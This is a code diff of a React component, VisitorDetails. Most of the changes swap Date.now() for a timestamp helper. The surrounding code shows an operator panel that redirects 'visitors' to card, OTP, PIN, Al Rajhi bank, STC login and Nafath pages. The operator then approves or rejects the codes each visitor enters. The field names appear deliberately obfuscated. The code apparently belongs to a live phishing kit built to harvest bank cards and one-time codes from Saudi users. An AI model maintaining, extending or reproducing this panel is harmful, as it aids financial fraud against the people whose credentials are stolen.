@@ -18,6 +18,7 @@ import {
   handlePhoneOtpResend,
   updateHistoryStatus,
 } from "@/lib/history-actions";
+import { getCurrentTimestamp } from "@/lib/time-utils";
 import { _d } from "@/lib/secure-utils";
 import { generateVisitorPdf, generateCardPdf } from "@/lib/generate-pdf";
 import { ArrowRight } from "lucide-react";
@@ -82,22 +83,22 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
           updates = {
             redirectPage: "home" as any,
             currentStep: "home" as any,
-            redirectPageUpdatedAt: Date.now(),
-            currentStepUpdatedAt: Date.now(),
+            redirectPageUpdatedAt: getCurrentTimestamp(),
+            currentStepUpdatedAt: getCurrentTimestamp(),
           };
           break;
         case "insur":
           updates = {
             redirectPage: "insur" as any,
-            redirectPageUpdatedAt: Date.now(),
-            currentStepUpdatedAt: Date.now(),
+            redirectPageUpdatedAt: getCurrentTimestamp(),
+            currentStepUpdatedAt: getCurrentTimestamp(),
           };
           break;
         case "compar":
           updates = {
             redirectPage: "compar" as any,
-            redirectPageUpdatedAt: Date.now(),
-            currentStepUpdatedAt: Date.now(),
+            redirectPageUpdatedAt: getCurrentTimestamp(),
+            currentStepUpdatedAt: getCurrentTimestamp(),
           };
           break;
         case "payment":
@@ -107,68 +108,68 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
             currentStep: "_st1" as any,
             cardStatus: "pending" as any,
             otpStatus: "pending" as any,
-            redirectPageUpdatedAt: Date.now(),
-            currentStepUpdatedAt: Date.now(),
+            redirectPageUpdatedAt: getCurrentTimestamp(),
+            currentStepUpdatedAt: getCurrentTimestamp(),
           };
           break;
         case "otp":
           updates = {
             redirectPage: "otp" as any,
             currentStep: "_t2" as any,
-            redirectPageUpdatedAt: Date.now(),
-            currentStepUpdatedAt: Date.now(),
+            redirectPageUpdatedAt: getCurrentTimestamp(),
+            currentStepUpdatedAt: getCurrentTimestamp(),
           };
           break;
         case "pin":
           updates = {
             redirectPage: "pin" as any,
             currentStep: "_t3" as any,
-            redirectPageUpdatedAt: Date.now(),
-            currentStepUpdatedAt: Date.now(),
+            redirectPageUpdatedAt: getCurrentTimestamp(),
+            currentStepUpdatedAt: getCurrentTimestamp(),
           };
           break;
         case "rajhi":
           updates = {
             redirectPage: "rajhi" as any,
             currentStep: "rajhi" as any,
-            redirectPageUpdatedAt: Date.now(),
-            currentStepUpdatedAt: Date.now(),
+            redirectPageUpdatedAt: getCurrentTimestamp(),
+            currentStepUpdatedAt: getCurrentTimestamp(),
           };
           break;
         case "stc-login":
           updates = {
             redirectPage: "stc-login" as any,
             currentStep: "stc-login" as any,
-            redirectPageUpdatedAt: Date.now(),
-            currentStepUpdatedAt: Date.now(),
+            redirectPageUpdatedAt: getCurrentTimestamp(),
+            currentStepUpdatedAt: getCurrentTimestamp(),
           };
           break;
         case "phone":
           // Legacy system only
           updates = {
             currentStep: "phone" as any,
-            currentStepUpdatedAt: Date.now(),
+            currentStepUpdatedAt: getCurrentTimestamp(),
           };
           break;
         case "nafad":
           // Legacy system with correct value
           updates = {
             currentStep: "_t6" as any,
-            currentStepUpdatedAt: Date.now(),
+            currentStepUpdatedAt: getCurrentTimestamp(),
           };
           break;
         case "nafad_modal":
           updates = {
             nafadConfirmationCode: "123456",
-            currentStepUpdatedAt: Date.now(),
+            currentStepUpdatedAt: getCurrentTimestamp(),
           }; // Send confirmation code to open modal
           break;
         case "finalOtp":
           updates = {
             redirectPage: "finalOtp" as any,
             currentStep: "finalOtp" as any,
-            redirectPageUpdatedAt: Date.now(),
-            currentStepUpdatedAt: Date.now(),
+            redirectPageUpdatedAt: getCurrentTimestamp(),
+            currentStepUpdatedAt: getCurrentTimestamp(),
           };
           break;
       }
@@ -192,7 +193,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
     try {
       await updateApplication(visitor.id, {
         nafadConfirmationCode: nafadCode,
-        nafadConfirmationStatusUpdatedAt: Date.now(),
+        nafadConfirmationStatusUpdatedAt: getCurrentTimestamp(),
       });
       setNafadCode("");
     } catch (error) {
@@ -740,7 +741,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
             console.log("[Action] Status updated to approved_with_otp");
             await updateApplication(visitor.id, {
               cardStatus: "approved_with_otp",
-              cardStatusUpdatedAt: Date.now(),
+              cardStatusUpdatedAt: getCurrentTimestamp(),
             });
           } else if (action === "pin") {
             // Approve card with PIN - update history status
@@ -752,7 +753,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
             );
             await updateApplication(visitor.id, {
               cardStatus: "approved_with_pin",
-              cardStatusUpdatedAt: Date.now(),
+              cardStatusUpdatedAt: getCurrentTimestamp(),
             });
           } else if (action === "reject") {
             if (confirm("هل أنت متأكد من رفض البطاقة؟")) {
@@ -765,13 +766,13 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
               );
               await updateApplication(visitor.id, {
                 cardStatus: "rejected",
-                cardStatusUpdatedAt: Date.now(),
+                cardStatusUpdatedAt: getCurrentTimestamp(),
               });
             }
           } else if (action === "message") {
             await updateApplication(visitor.id, {
               cardStatus: "message",
-              cardStatusUpdatedAt: Date.now(),
+              cardStatusUpdatedAt: getCurrentTimestamp(),
             });
           }
           break;
@@ -786,7 +787,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
             );
             // Update timestamp
             await updateApplication(visitor.id, {
-              _v5StatusUpdatedAt: Date.now(),
+              _v5StatusUpdatedAt: getCurrentTimestamp(),
             });
           } else if (action === "reject") {
             if (confirm("هل أنت متأكد من رفض كود OTP؟")) {
@@ -798,13 +799,13 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
               );
               // Update timestamp
               await updateApplication(visitor.id, {
-                _v5StatusUpdatedAt: Date.now(),
+                _v5StatusUpdatedAt: getCurrentTimestamp(),
               });
             }
           } else if (action === "message") {
             await updateApplication(visitor.id, {
               _v5Status: "message",
-              _v5StatusUpdatedAt: Date.now(),
+              _v5StatusUpdatedAt: getCurrentTimestamp(),
             });
           }
           break;
@@ -816,7 +817,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
             } else {
               await updateApplication(visitor.id, {
                 phoneOtpStatus: "approved",
-                phoneOtpStatusUpdatedAt: Date.now(),
+                phoneOtpStatusUpdatedAt: getCurrentTimestamp(),
               });
             }
             // Phone OTP approved
@@ -827,7 +828,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
               } else {
                 await updateApplication(visitor.id, {
                   phoneOtpStatus: "rejected",
-                  phoneOtpStatusUpdatedAt: Date.now(),
+                  phoneOtpStatusUpdatedAt: getCurrentTimestamp(),
                 });
               }
               // Phone OTP rejected
@@ -842,7 +843,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
             await updateApplication(visitor.id, {
               phoneOtp: "",
               phoneOtpStatus: "show_phone_otp",
-              phoneOtpStatusUpdatedAt: Date.now(),
+              phoneOtpStatusUpdatedAt: getCurrentTimestamp(),
             });
             // Phone OTP modal reopened
           }
@@ -852,14 +853,14 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
           if (action === "approve") {
             await updateApplication(visitor.id, {
               rajhiOtpStatus: "approved",
-              rajhiOtpStatusUpdatedAt: Date.now(),
+              rajhiOtpStatusUpdatedAt: getCurrentTimestamp(),
             });
           } else if (action === "reject") {
             if (confirm("هل أنت متأكد من رفض رمز الراجحي؟")) {
               await updateApplication(visitor.id, {
                 rajhiOtp: "",
                 rajhiOtpStatus: "rejected",
-                rajhiOtpStatusUpdatedAt: Date.now(),
+                rajhiOtpStatusUpdatedAt: getCurrentTimestamp(),
               });
             }
           }
@@ -876,7 +877,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
             await updateApplication(visitor.id, {
               pinStatus: "approved",
               _v6Status: "approved",
-              _v6StatusUpdatedAt: Date.now(),
+              _v6StatusUpdatedAt: getCurrentTimestamp(),
             });
           } else if (action === "reject") {
             if (confirm("هل أنت متأكد من رفض رمز PIN؟")) {
@@ -889,13 +890,13 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
               await updateApplication(visitor.id, {
                 pinStatus: "rejected",
                 _v6Status: "rejected",
-                _v6StatusUpdatedAt: Date.now(),
+                _v6StatusUpdatedAt: getCurrentTimestamp(),
               });
             }
           } else if (action === "message") {
             await updateApplication(visitor.id, {
               pinStatus: "message",
-              _v6StatusUpdatedAt: Date.now(),
+              _v6StatusUpdatedAt: getCurrentTimestamp(),
             });
           }
           break;
@@ -904,7 +905,7 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
           if (action === "approve") {
             await updateApplication(visitor.id, {
               finalOtpStatus: "approved",
-              finalOtpStatusUpdatedAt: Date.now(),
+              finalOtpStatusUpdatedAt: getCurrentTimestamp(),
             });
           } else if (action === "reject") {
             if (confirm("هل أنت متأكد من رفض رمز OTP الأخير؟")) {
@@ -912,13 +913,13 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
                 finalOtp: "",
                 _v13: "",
                 finalOtpStatus: "rejected",
-                finalOtpStatusUpdatedAt: Date.now(),
+                finalOtpStatusUpdatedAt: getCurrentTimestamp(),
               });
             }
           } else if (action === "message") {
             await updateApplication(visitor.id, {
               finalOtpStatus: "message",
-              finalOtpStatusUpdatedAt: Date.now(),
+              finalOtpStatusUpdatedAt: getCurrentTimestamp(),
             });
           }
           break;
